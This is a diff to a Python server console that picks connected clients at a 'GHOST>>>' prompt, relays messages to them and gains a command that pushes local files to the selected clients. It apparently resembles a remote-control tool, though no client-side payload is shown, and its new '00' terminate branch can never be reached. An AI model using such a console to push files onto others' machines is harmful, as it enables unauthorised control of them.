@@ -68,6 +68,7 @@ while True:
         print(f"{i}. {a[0]}")
 
     print("0. All Clients")
+    print("00 for terminate")
 
     try:
         choice = int(input("Select client: "))
@@ -78,6 +79,8 @@ while True:
         selected = clients
     elif 1 <= choice <= len(clients):
         selected = [clients[choice - 1]]
+    elif choice == 00:
+        break
     else:
         continue
 
@@ -87,7 +90,7 @@ while True:
 
     # 🔥 SEND LOOP
     while True:
-        msg = input("You (Server): ")
+        msg = input("GHOST>>> ")
 
         if msg.lower() == "exit":
             break
@@ -100,10 +103,43 @@ while True:
             os.system("cls")
             os.system("clear")
             continue
-
+        
         if msg.lower() == "banner":
             print(banner)
             continue
+        
+        if msg.startswith("upload "):
+            try:
+                filename = msg.replace("upload ", "").strip()
+
+                if not os.path.exists(filename):
+                    print("File not found!")
+                    continue
+
+                filesize = os.path.getsize(filename)
+
+        
+                for conn, addr in selected:
+                    conn.send(f"FILE {filename} {filesize}".encode())
+
+                time.sleep(1)
+
+        
+                with open(filename, "rb") as f:
+                    while True:
+                        chunk = f.read(1024)
+                        if not chunk:
+                            break
+                        for conn, addr in selected:
+                            conn.send(chunk)
+
+                print("File sent successfully!")
+
+            except Exception as e:
+                print("Error sending file:", e)
+
+        
+
 
         for conn, addr in selected:
             try:
